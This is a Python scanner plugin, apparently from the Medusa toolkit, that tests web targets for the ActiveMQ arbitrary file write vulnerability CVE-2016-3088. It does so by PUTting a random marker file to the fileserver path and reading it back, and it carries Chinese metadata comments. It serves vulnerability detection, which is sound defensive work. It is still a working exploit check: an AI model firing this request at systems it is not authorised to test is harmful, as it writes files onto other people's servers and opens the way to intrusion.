#!/usr/bin/env python
# _*_ coding: utf-8 _*_
import ClassCongregation
import requests
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number'] = "CVE-2016-3088"  # 如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2019-10-13"  # 插件编辑时间
        self.info['disclosure'] = '2019-10-13'  # 漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "ActiveMQArbitraryFileWritingVulnerability"  # 插件名称
        self.info['name'] ='ActiveMQ任意文件写入漏洞' #漏洞名称
        self.info['affects'] = "ActiveMQ"  # 漏洞组件
        self.info['desc_content'] = ""  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['version'] = "未知"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果


def medusa(**kwargs)->None:
    url=kwargs.get("Url")#获取传入的url参数
    Headers=kwargs.get("Headers")#获取传入的头文件
    proxies=kwargs.get("Proxies")#获取传入的代理参数
    try:
        PayloadPoc = "/fileserver/Medusa.txt"
        PayloadUrl = url+PayloadPoc
        PayloadCode = ClassCongregation.randoms().result(50)+'@Medusa'
        Headers["Connection"]="close"
        
        s = requests.session()

        resp = s.put(PayloadUrl, data=PayloadCode, headers=Headers, proxies=proxies,timeout=3,verify=False)
        code = resp.status_code
        resp2=s.get(PayloadUrl, headers=Headers,proxies=proxies, timeout=3).text
        if code==204 and resp2.find(PayloadCode)!=-1:
            Medusa = "{} 存在ActiveMQ任意文件写入漏洞（CVE-2016-3088）\r\n漏洞详情:\r\nPayload:{}\r\nPUT内容:{}\r\n".format(url, PayloadUrl,PayloadCode)
            _t = VulnerabilityInfo(Medusa)
            ClassCongregation.VulnerabilityDetails(_t.info, resp,**kwargs).Write()  # 传入url和扫描到的数据
            ClassCongregation.WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ClassCongregation.ErrorHandling().Outlier(e, _)
        _l=ClassCongregation.ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类

